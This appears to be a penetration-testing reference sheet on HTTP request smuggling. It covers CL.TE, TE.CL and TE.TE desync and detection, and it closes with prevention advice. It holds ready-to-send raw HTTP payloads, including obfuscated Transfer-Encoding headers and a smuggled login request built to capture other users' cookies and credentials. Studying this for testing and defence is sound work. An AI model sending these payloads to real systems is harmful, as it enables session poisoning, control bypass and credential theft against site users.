# HTTP Request Smuggling
> Sources: WSTG v4.2, Real-World Bug Hunting (Yaworski), The Tangled Web (Zalewski)

## What Is HTTP Request Smuggling?

Frontend/backend proxy desync on how they parse `Content-Length` vs `Transfer-Encoding` headers.
The frontend sees one request; the backend sees two — the second "smuggled" request gets prepended
to the next legitimate user's request, poisoning their session.

## CL.TE — Frontend Uses Content-Length, Backend Uses Transfer-Encoding

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The frontend reads 13 bytes (the body including `0\r\n\r\nSMUGGLED`).
The backend reads the chunked body: chunk of size `0` = end, leaving `SMUGGLED` in the buffer.

## TE.CL — Frontend Uses Transfer-Encoding, Backend Uses Content-Length

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

Frontend reads the chunked body (8 bytes + terminator). Backend reads only 3 bytes (CL=3) =
`8\r\n`, leaving `SMUGGLED\r\n0\r\n\r\n` in buffer for the next request.

## TE.TE — Both Use Transfer-Encoding But One Is Obfuscated

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked        ← space before colon
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked        ← leading space
```

One server parses the obfuscated TE and falls back to CL; the other honors TE.

## Detection

### Timing Attack (Safest Method)

```
# CL.TE timing test: send TE body with no final chunk terminator
# → Backend hangs waiting for more chunked data if TE-first
# → Returns immediately if CL-first

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
```

If response takes 10+ seconds → TE.CL or CL.TE behavior confirmed.

### Burp Suite HTTP Request Smuggler Extension
- Right-click request → Extensions → HTTP Request Smuggler → Smuggle Probe
- Automatically tests CL.TE, TE.CL, TE.TE variants
- Reports timing and differential response anomalies

### Confirm with Differential Response

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404page HTTP/1.1
X-Ignore: x
```

If the next request to the server returns a 404 (because it got the smuggled GET /404page
prepended) → smuggling confirmed.

## Impact

- **Bypass security controls**: WAF, IP allowlists, authentication — the smuggled request
  bypasses frontend security because it arrives at the backend as a second "trusted" request
- **Capture other users' requests**: Smuggle a partial request that causes the next user's
  request to be appended as the body, leaking their cookies and credentials
- **Reflected XSS via request smuggling**: Inject XSS payload into next user's response
- **Cache poisoning**: Poison the cache with a crafted response for a URL the next user requests
- **Web cache deception**: Smuggle a request that caches an authenticated response at a public URL

## Capturing Other Users' Credentials

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 198
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

username=POST+/+HTTP/1.1
Host:+target.com
...
```

The next user's request gets appended to the smuggled POST body, and that body is returned
to you if /login echoes back the request body on error.

## Real-World Targets

Frontend/backend combos most likely vulnerable:
- Akamai, Cloudflare, Fastly CDN → backend nginx/Apache
- HAProxy → Apache/nginx
- AWS ALB → EC2 backends
- nginx reverse proxy → Gunicorn/uWSGI

## Prevention
- Normalize ambiguous requests at the frontend
- Reject requests with both CL and TE headers (or drop CL when TE is present)
- Use HTTP/2 end-to-end (no HTTP/1.1 smuggling possible with true H2)
